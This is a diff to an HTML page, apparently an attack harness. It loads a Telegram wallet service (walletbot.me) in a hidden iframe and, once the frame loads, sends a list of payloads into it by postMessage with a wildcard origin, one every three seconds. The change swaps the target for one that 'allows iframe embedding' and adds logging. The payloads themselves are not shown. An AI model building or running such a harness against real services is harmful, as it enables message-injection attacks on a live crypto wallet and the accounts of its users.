@@ -5,7 +5,9 @@
   </head>
   <body>
     <h1>Testing Payloads...</h1>
-    <iframe id="tg_frame" src="https://web.telegram.org/a/" style="display:none;"></iframe>
+
+    <!-- ✅ Use a URL that allows iframe embedding -->
+    <iframe id="tg_frame" src="https://walletbot.me" style="display:none;"></iframe>
 
     <script>
       const payloads = [
@@ -31,18 +33,29 @@
         });
 
         const iframe = document.getElementById("tg_frame");
-        iframe.contentWindow.postMessage(message, "*");
+
+        if (iframe && iframe.contentWindow) {
+          iframe.contentWindow.postMessage(message, "*");
+        } else {
+          console.warn("⚠️ iframe not ready or blocked.");
+        }
 
         index++;
         if (index < payloads.length) {
-          setTimeout(sendPayload, 3000); // Wait 3 sec for next payload
+          setTimeout(sendPayload, 3000);
         }
       };
 
       window.onload = function () {
         const iframe = document.getElementById("tg_frame");
+
         iframe.onload = function () {
+          console.log("✅ iframe loaded");
           sendPayload();
+        };
+
+        iframe.onerror = function () {
+          console.error("❌ iframe failed to load");
         };
       };
     </script>
